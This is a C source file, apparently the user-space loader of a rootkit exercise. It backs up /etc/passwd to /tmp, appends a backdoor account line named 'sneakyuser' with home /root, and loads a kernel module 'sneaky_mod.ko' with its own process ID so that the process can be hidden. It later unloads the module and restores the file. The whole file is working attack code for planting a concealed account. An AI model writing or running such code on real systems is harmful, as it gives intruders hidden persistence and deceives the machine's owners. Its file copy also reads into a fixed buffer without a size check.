#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

void copy_File(const char *input, const char *output) {
  char buffer[40000];
  long numbytes;
  FILE *ifp, *ofp;

  if ((ifp = fopen(input, "r")) == NULL) {

    fprintf(stderr, "Can't open input file %s\n", input);
    exit(1);
  }
  // get number of bytes;
  fseek(ifp, 0L, SEEK_END);
  numbytes = ftell(ifp);
  fseek(ifp, 0L, SEEK_SET);

  size_t len = fread(buffer, sizeof(char), numbytes, ifp);
  buffer[len] = '\0';
  fclose(ifp);
  printf("Buffer reads: %s\n", buffer);

  ofp = fopen(output, "w+");
  len = fwrite(buffer, sizeof(char), numbytes, ofp);
  fclose(ofp);
}
void add_line(const char *input) {
  FILE *fp;
  char *str = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  if ((fp = fopen(input, "a")) == NULL) {

    fprintf(stderr, "Can't open file %s\n", input);
    exit(1);
  }
  fprintf(fp, "%s\n", str);
  fclose(fp);
}

void load_sneaky(char *moduleName) {
  pid_t cpid, wpid;
  int status;
  cpid = fork();
  if (cpid == -1) {
    perror("fork");
    exit(1);
  }
  if (cpid == 0) {
    pid_t spid = getpid();
    char spid_arg[60];
    sprintf(spid_arg, "sneaky_pid=%d", spid);
    char *args[4];
    args[0] = "insmod";
    args[1] = moduleName;
    args[2] = spid_arg;
    args[3] = NULL;
    printf("before exec\n");
    /* int execReturn = */
    /*     execl("/sbin/insmod", "insmod", moduleName, spid_arg, (char *)0); */

    /* if (execReturn == -1) { */
    /*   perror("load module exec error"); */
    /*   exit(EXIT_FAILURE); */
    /* } */
    int e = execvp(args[0], args);

    if (e < 0) {
      perror("Fail to load module");
    }
  }
  /* Code executed by parent */
  else {
    do {
      wpid = waitpid(cpid, &status, WUNTRACED | WCONTINUED);
      if (wpid == -1) {
        perror("waitpid");
        return;
      }

      if (WIFEXITED(status)) {
        printf("Load sneaky module sucessfully.\n");
        printf("Program exited with status %d\n", WEXITSTATUS(status));

      } else if (WIFSIGNALED(status)) {
        printf("Program was killed by signal %d\n", WTERMSIG(status));
      }

    } while (!WIFEXITED(status) && !WIFSIGNALED(status));
  }
}

void remove_sneaky(char *moduleName) {

  pid_t cpid, wpid;
  int status;
  cpid = fork();
  if (cpid == -1) {
    perror("fork");
    exit(1);
  }
  if (cpid == 0) {
    pid_t spid = getpid();
    char spid_arg[60];
    sprintf(spid_arg, "sneaky_pid=%d", spid);
    char *args[3];
    args[0] = "rmmod";
    args[1] = moduleName;
    args[2] = NULL;

    int e = execvp(args[0], args);

    if (e < 0) {
      perror("Fail to load module");
    }
  }
  /* Code executed by parent */
  else {
    do {
      wpid = waitpid(cpid, &status, WUNTRACED | WCONTINUED);
      if (wpid == -1) {
        perror("waitpid");
        return;
      }

      if (WIFEXITED(status)) {
        printf("Remove sneaky module sucessfully.\n");
        printf("Program exited with status %d\n", WEXITSTATUS(status));

      } else if (WIFSIGNALED(status)) {
        printf("Program was killed by signal %d\n", WTERMSIG(status));
      }

    } while (!WIFEXITED(status) && !WIFSIGNALED(status));
  }
}

void restore_file(const char *Destination, const char *Source) {
  copy_File(Source, Destination);
}

int main() {
  // Print Process ID

  printf("sneaky_process pid = %d\n", getpid());
  const char *inputFile = "/etc/passwd";
  const char *outputFile = "/tmp/passwd";
  char *moduleName = "sneaky_mod.ko";
  copy_File(inputFile, outputFile);
  add_line(inputFile);
  printf("I am here\n");
  load_sneaky(moduleName);
  printf("Type 'q' to exit\n");
  while (getchar() != 'q') {
    printf("Type 'q' to exit\n");
  }
  remove_sneaky(moduleName);

  restore_file(inputFile, outputFile);
  return 0;
}
